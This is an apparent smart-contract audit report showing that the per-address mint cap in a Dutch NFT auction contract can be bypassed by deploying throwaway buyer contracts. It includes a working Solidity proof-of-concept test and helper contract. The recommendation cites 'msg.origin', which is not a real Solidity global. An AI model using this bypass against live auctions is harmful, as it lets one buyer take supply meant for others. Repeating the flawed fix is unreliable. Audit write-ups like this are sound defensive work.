# [M] `CAP_PER_ADDRESS` can easily be bypassed

## Summary
Severity: Medium
Reporter: immeas
Source: https://github.com/sherlock-audit/2023-07-beam-auction/blob/main/dutch-nft/src/MeritDutchAuction.sol#L132-L143
Type: audit-issue

## Details
# `CAP_PER_ADDRESS` can easily be bypassed

## Summary
The `CAP_PER_ADDRESS` can be circumvented by using different contracts to buy the NFTs, thus having new `msg.sender` addresses.

## Vulnerability Detail
`MeritDutchAuction` has a limit on how many NFTs a single account can buy:

https://github.com/sherlock-audit/2023-07-beam-auction/blob/main/dutch-nft/src/MeritDutchAuction.sol#L132-L143
```solidity
File: MeritDutchAuction.sol

132:        // Cache mintedPerAddressBefore to save on sloads
133:        uint256 mintedPerAddressBefore = mintedPerAddress[msg.sender];
...
142:        // Cannot mint more than the cap per address
143:        require(mintedPerAddressBefore + amount <= CAP_PER_ADDRESS, "Mint cap per address reached");
```

This is can be circumvented by creating new contracts that buys the NFTs on behalf of the owner:

### PoC in `MeritDutchAuctionTest.t.sol`:
```solidity
    function testBuyAll() public {
        vm.warp(startTime);
        vm.startPrank(wallet1);
        for(uint256 i = 0 ; i< 2500 ; i++) {
            (new BuySomeNfts){value: 4e18}(auction,nft);
        }
        vm.stopPrank();

        // wallet1 owns all nfts
        assertEq(10_000,nft.balanceOf(wallet1));
    }
```
`BuySomeNfts`:
```solidity
contract BuySomeNfts is Ownable {

    constructor(MeritDutchAuction auction, MeritNFT nft) payable {
        uint256 before = auction.minted();
        auction.mint{value: 4e18}(4);
        
        for(uint256 i = before ; i < before + 4 ; i++) {
            nft.transferFrom(address(this), owner(), i+1);
        }
    }
}
```

## Impact
Any user can either create multiple accounts or use a different contracts to buy more than 4 nfts, thus bypassing the `CAP_PER_ADDRESS`

## Code Snippet
See above.

## Tool used
Manual Review

## Recommendation
Consider enforcing it on `msg.origin` that would at least force the calls to be in different txs giving other users a chance buy. Or simply skip the check all together.
